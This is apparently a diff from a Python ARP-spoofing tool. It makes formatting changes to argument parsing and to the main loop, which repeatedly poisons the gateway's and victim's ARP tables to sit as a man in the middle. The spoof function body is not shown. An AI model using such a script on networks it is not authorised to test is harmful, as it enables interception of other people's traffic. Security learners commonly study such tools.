@@ -15,9 +15,9 @@ def passed_args():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('-g', '--gatway', dest='gateway',
-                              help="Gateway's IP address")
+                        help="Gateway's IP address")
     parser.add_argument('-v', '--victim', dest='victim',
-                             help="Victims's IP address")
+                        help="Victims's IP address")
     data = parser.parse_args()
     return data
 
@@ -73,7 +73,7 @@ def unspoof(device, pretended):
 def main():
     _count = 0
     data = passed_args()
-    if data.gateway == None or data.victim == None:
+    if not data.gateway or not data.victim:
         try:
             gateway = input("Gateway's IP: ")
             victim = input("Victim's IP: ")
@@ -84,16 +84,20 @@ def main():
             exit()
     elif data.gateway and data.victim:
         gateway = data.gateway
-        victim =  data.victim
+        victim = data.victim
     try:
         while 1:
             _count += 2
-            # Updating gateway's ARP table with vicitim's IP and our MAC address
+
+            # Updating gateway's ARP table with
+            # vicitim's IP and our MAC address
             spoof(gateway, victim)
-            # Updating vicitim's ARP table with gateway's IP and our MAC address
+
+            # Updating vicitim's ARP table with
+            # gateway's IP and our MAC address
             spoof(victim, gateway)
             print(f"\r[+] Being man in the middle | Packets sent: {_count}",
-                                                                   end="")
+                  end="")
 
             sleep(1)
     except KeyboardInterrupt:
